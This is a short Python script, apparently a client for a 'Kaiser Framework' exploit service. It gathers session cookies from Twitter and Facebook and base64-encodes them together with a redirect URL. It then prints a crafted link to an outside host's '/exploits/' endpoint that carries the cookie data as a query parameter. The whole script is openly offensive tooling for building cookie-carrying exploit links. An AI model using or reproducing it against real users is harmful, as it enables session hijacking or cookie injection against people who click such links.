import requests
import base64
import json

#redirect url
redirectUrl = "https://twitter.com/KaiserFramework"

#init sesh
s = requests.session()

#obtain cookies
s.get("https://twitter.com/KaiserFramework")
s.get("https://facebook.com")

#parse cookies
cookieStr = ""
cookies = [ {'name': c.name, 'value': c.value, 'domain': c.domain, 'path': c.path} for c in s.cookies ]
for cookie in cookies:
	cookie['domain'] = cookie['domain'][1:]
	cookie['domain'] = "https://"+cookie['domain']

#create url	
cookies = json.dumps(cookies)
cookieStr = base64.b64encode(bytes(cookies, 'utf-8')).decode()
url = base64.b64encode(bytes(redirectUrl, 'utf-8')).decode()
expToken = f"https://api.kaiserframework.com/exploits/?cookie={cookieStr}&redirect={url}"	
print(f"URL: {expToken}")
